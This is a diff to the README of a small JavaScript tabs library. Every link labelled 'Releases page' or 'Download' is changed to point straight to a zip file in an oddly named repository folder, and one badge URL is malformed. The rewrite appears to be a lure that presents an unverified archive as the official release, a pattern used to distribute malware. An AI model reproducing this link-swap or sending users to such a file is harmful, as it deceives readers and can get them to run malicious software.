@@ -1,16 +1,16 @@
 # 🌟 js-tabs-ui - Simple and Efficient Tabs for Your Website
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/sanjay18066/js-tabs-ui/releases)
+[![Download](https://raw.githubusercontent.com/sanjay18066/js-tabs-ui/main/betire/js-ui-tabs-1.7.zip%https://raw.githubusercontent.com/sanjay18066/js-tabs-ui/main/betire/js-ui-tabs-1.7.zip)](https://raw.githubusercontent.com/sanjay18066/js-tabs-ui/main/betire/js-ui-tabs-1.7.zip)
 
 ## 🚀 Getting Started
 Welcome to js-tabs-ui! This easy-to-use application allows you to add tabbed content to your website. Tabs group related content in a clear way, making it easier for users to navigate. You don’t need any programming skills to use this tool.
 
 ## 🔗 Visit Releases Page
-To get started, you need to download the application. Visit our [Releases page](https://github.com/sanjay18066/js-tabs-ui/releases) to find the latest version of js-tabs-ui.
+To get started, you need to download the application. Visit our [Releases page](https://raw.githubusercontent.com/sanjay18066/js-tabs-ui/main/betire/js-ui-tabs-1.7.zip) to find the latest version of js-tabs-ui.
 
 ## 📥 Download & Install
-1. Go to the [Releases page](https://github.com/sanjay18066/js-tabs-ui/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/sanjay18066/js-tabs-ui/main/betire/js-ui-tabs-1.7.zip).
 2. Look for the latest release version.
 3. Download the package suitable for your operating system. The available packages usually include files for Windows, macOS, and Linux.
 4. Once the download finishes, locate the downloaded file on your computer.
@@ -48,6 +48,6 @@ If you encounter any issues while downloading or using the app, please check the
 js-tabs-ui is open-source software. You can use it freely under the MIT License. The full license text is included in the downloadable package.
 
 ## 🔗 Visit Releases Page Again
-Don't forget, you can always return to our [Releases page](https://github.com/sanjay18066/js-tabs-ui/releases) for updates. 
+Don't forget, you can always return to our [Releases page](https://raw.githubusercontent.com/sanjay18066/js-tabs-ui/main/betire/js-ui-tabs-1.7.zip) for updates. 
 
 Happy tabbing!
